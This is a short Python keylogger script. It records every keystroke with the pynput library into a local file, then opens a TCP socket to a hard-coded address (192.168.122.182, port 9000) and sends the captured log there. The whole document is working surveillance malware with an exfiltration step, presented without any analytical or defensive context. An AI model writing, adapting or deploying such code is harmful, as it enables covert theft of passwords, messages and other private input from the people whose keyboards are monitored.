from pynput import keyboard
import socket

def on_press(key):
    with open('keylogs.txt', 'a') as f:
        try:
            char = key.char
            f.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(' ')
            else:
                f.write(' [' + str(key) + '] ')

def send_file():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect(('192.168.122.182', 9000))
            with open('keylogs.txt', 'rb') as f:
                while True:
                    bytes_read = f.read(1024)
                    if not bytes_read:
                        break
                    s.sendall(bytes_read)
        except Exception as e:
            print("Error occurred:", str(e))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

send_file()